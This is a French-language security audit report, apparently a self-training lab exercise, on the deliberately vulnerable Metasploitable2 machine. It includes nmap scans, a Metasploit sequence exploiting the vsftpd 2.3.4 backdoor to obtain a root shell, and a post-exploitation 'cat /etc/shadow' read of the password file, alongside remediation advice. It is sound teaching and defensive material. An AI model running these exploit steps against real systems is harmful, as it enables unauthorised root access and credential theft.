# Rapport d'Audit de Sécurité — Metasploitable2

**Auteur :** Cosme OBOLI
**Date :** 26 Juin 2026
**Environnement :** Lab virtuel isolé (VirtualBox — réseau interne `lab-network`)
**Cible :** Metasploitable2 (192.168.56.30)
**Attaquant :** Parrot OS Security (192.168.56.20)

> ⚠️ Ce rapport a été réalisé dans un cadre strictement pédagogique, sur une machine volontairement vulnérable (Metasploitable2) au sein d'un lab isolé sans connexion à un réseau de production.

---

## 1. Résumé Exécutif

Un audit de sécurité a été mené sur la machine cible Metasploitable2 dans le cadre d'un exercice d'apprentissage en pentesting. L'audit a révélé **plusieurs vulnérabilités critiques**, dont une a été activement exploitée pour démontrer un accès root complet au système.

**Niveau de risque global : CRITIQUE**

| Vulnérabilités critiques | Vulnérabilités élevées | Vulnérabilités moyennes |
|---|---|---|
| 2 | 3 | 3 |

---

## 2. Méthodologie

L'audit a suivi une méthodologie classique en 3 phases :

```
1. Reconnaissance      → Nmap (découverte réseau + scan de ports)
2. Identification      → Nmap NSE Scripts (--script vuln)
3. Exploitation        → Metasploit Framework
```

### Outils utilisés
- **Nmap 7.94SVN** — scan réseau et détection de vulnérabilités
- **Metasploit Framework** — exploitation

---

## 3. Découverte et Reconnaissance

### 3.1 Découverte réseau

```bash
sudo nmap -sn 192.168.56.0/24
```

**Résultat :** Identification de la machine cible à l'adresse `192.168.56.30`.

### 3.2 Scan de ports et services

```bash
sudo nmap -sV 192.168.56.30
```

**23 ports ouverts détectés**, dont plusieurs services obsolètes et non maintenus depuis 2010-2011.

| Port | Service | Version |
|---|---|---|
| 21 | FTP | vsftpd 2.3.4 |
| 22 | SSH | OpenSSH 4.7p1 |
| 23 | Telnet | Linux telnetd |
| 25 | SMTP | Postfix smtpd |
| 80 | HTTP | Apache 2.2.8 |
| 3306 | MySQL | MySQL 5.0.51a |
| 5432 | PostgreSQL | PostgreSQL 8.3.0 |
| 6667 | IRC | UnrealIRCd |
| 8180 | HTTP | Apache Tomcat |

---

## 4. Vulnérabilités Identifiées

### 🔴 VULN-01 — Backdoor vsFTPd 2.3.4 (CRITIQUE)

| Champ | Détail |
|---|---|
| **CVE** | CVE-2011-2523 |
| **Port** | 21/tcp |
| **Service** | vsftpd 2.3.4 |
| **CVSS estimé** | 10.0 (Critique) |

**Description :**
La version 2.3.4 de vsFTPd a été compromise par un attaquant qui a inséré une backdoor dans le code source officiel, distribuée publiquement entre le 30 juin et le 3 juillet 2011. Cette backdoor permet l'exécution de commandes arbitraires en envoyant la séquence `:)` dans le champ nom d'utilisateur lors d'une connexion FTP, ouvrant un shell root sur le port 6200.

**Preuve d'exploitation (PoC) :**
```
[+] 192.168.56.30:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.30:21 - UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened (192.168.56.20:38691 -> 192.168.56.30:6200)
```

**Impact :** Compromission totale du système avec privilèges root, sans authentification.

**Recommandation :** Mettre à jour vsFTPd vers une version supérieure à 2.3.5, ou utiliser une alternative maintenue (ProFTPd, Pure-FTPd).

---

### 🔴 VULN-02 — RMI Registry Remote Code Execution (CRITIQUE)

| Champ | Détail |
|---|---|
| **Port** | 1099/tcp |
| **Service** | Java RMI Registry |
| **CVSS estimé** | 9.8 (Critique) |

**Description :**
La configuration par défaut du registre RMI permet le chargement de classes depuis des URLs distantes, pouvant conduire à une exécution de code arbitraire à distance.

**Recommandation :** Désactiver le chargement de classes distantes ou restreindre l'accès au service RMI via firewall.

---

### 🟠 VULN-03 — Injection SQL (Mutillidae) (ÉLEVÉ)

| Champ | Détail |
|---|---|
| **Port** | 80/tcp |
| **Application** | Mutillidae (application volontairement vulnérable) |
| **CVSS estimé** | 8.6 (Élevé) |

**Description :**
Plus de 150 points d'injection SQL potentiels ont été détectés sur l'application web Mutillidae, notamment sur le champ `username` du formulaire de connexion.

**Recommandation :** Utiliser des requêtes préparées (prepared statements) et valider/échapper systématiquement les entrées utilisateur.

---

### 🟠 VULN-04 — UnrealIRCd Backdoor (ÉLEVÉ)

| Champ | Détail |
|---|---|
| **Port** | 6667/tcp |
| **Service** | UnrealIRCd |

**Description :**
Version d'UnrealIRCd connue pour contenir une backdoor historique (2010), permettant l'exécution de commandes à distance.

**Recommandation :** Mettre à jour vers la dernière version stable d'UnrealIRCd.

---

### 🟠 VULN-05 — Slowloris DoS (ÉLEVÉ)

| Champ | Détail |
|---|---|
| **CVE** | CVE-2007-6750 |
| **Port** | 80/tcp, 8180/tcp |
| **Service** | Apache HTTP / Tomcat |

**Description :**
Les serveurs web sont vulnérables à l'attaque Slowloris, qui maintient de nombreuses connexions partiellement ouvertes pour épuiser les ressources du serveur (déni de service).

**Recommandation :** Configurer des timeouts de connexion stricts et limiter le nombre de connexions simultanées par IP.

---

### 🟡 VULN-06 — SSL POODLE (MOYEN)

| Champ | Détail |
|---|---|
| **CVE** | CVE-2014-3566 |
| **Port** | 25/tcp |

**Description :** Le protocole SSLv3 utilisé est vulnérable à l'attaque POODLE, permettant une fuite d'informations via attaque de l'homme du milieu (MITM).

**Recommandation :** Désactiver SSLv3 et n'autoriser que TLS 1.2 ou supérieur.

---

### 🟡 VULN-07 — DROWN Attack (MOYEN)

| Champ | Détail |
|---|---|
| **CVE** | CVE-2016-0800 |
| **Port** | 25/tcp |

**Description :** Le support de SSLv2 permet une attaque cross-protocole (DROWN) pouvant déchiffrer du trafic TLS.

**Recommandation :** Désactiver complètement le support SSLv2.

---

### 🟡 VULN-08 — Diffie-Hellman Faible (MOYEN)

| Champ | Détail |
|---|---|
| **Port** | 5432/tcp |
| **Service** | PostgreSQL |

**Description :** Utilisation de groupes Diffie-Hellman de force insuffisante (1024 bits), vulnérables à l'espionnage passif.

**Recommandation :** Utiliser des groupes DH de 2048 bits minimum.

---

## 5. Exploitation Démontrée

### 5.1 Exploitation de VULN-01 (vsFTPd Backdoor)

**Outil :** Metasploit Framework

```
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.30
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

**Résultat obtenu :**
```
[+] 192.168.56.30:21 - UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened
```

**Post-exploitation — Preuve d'accès complet :**
```bash
whoami
# root

cat /etc/shadow
# Accès confirmé au fichier des mots de passe système
```

**Conclusion :** L'exploitation confirme un accès root complet et non authentifié au système cible via le service FTP.

---

## 6. Synthèse des Risques

| ID | Vulnérabilité | Gravité | Exploité |
|---|---|---|---|
| VULN-01 | vsFTPd 2.3.4 Backdoor | 🔴 Critique | ✅ Oui |
| VULN-02 | RMI Registry RCE | 🔴 Critique | ❌ Non testé |
| VULN-03 | Injection SQL (Mutillidae) | 🟠 Élevé | ❌ Non testé |
| VULN-04 | UnrealIRCd Backdoor | 🟠 Élevé | ❌ Non testé |
| VULN-05 | Slowloris DoS | 🟠 Élevé | ❌ Non testé |
| VULN-06 | SSL POODLE | 🟡 Moyen | ❌ Non testé |
| VULN-07 | DROWN Attack | 🟡 Moyen | ❌ Non testé |
| VULN-08 | DH Faible | 🟡 Moyen | ❌ Non testé |

---

## 7. Recommandations Générales

1. **Mettre à jour tous les services** vers leurs dernières versions stables
2. **Désactiver les protocoles obsolètes** (SSLv2, SSLv3, Telnet)
3. **Mettre en place un firewall** restrictif (principe du moindre privilège)
4. **Auditer le code des applications web** contre les injections SQL/XSS
5. **Mettre en place un système de monitoring** (SIEM) pour détecter les tentatives d'intrusion
6. **Effectuer des audits de sécurité réguliers** (au minimum trimestriels)

---

## 8. Conclusion

Cet audit, mené dans un environnement de lab pédagogique, a permis de démontrer concrètement le cycle complet d'une attaque informatique : de la reconnaissance à l'exploitation, jusqu'à l'obtention d'un accès root complet. La machine Metasploitable2 illustre parfaitement les conséquences d'un défaut de maintenance et de mise à jour des systèmes en production.

Cette expérience pratique renforce la compréhension des mécanismes d'attaque et constitue une base solide pour les compétences en sécurité défensive (Blue Team) qui seront développées dans les phases suivantes du programme de formation.

---

*Rapport rédigé dans le cadre du programme d'auto-formation Cybersécurité & Réseau 2026-2027.*
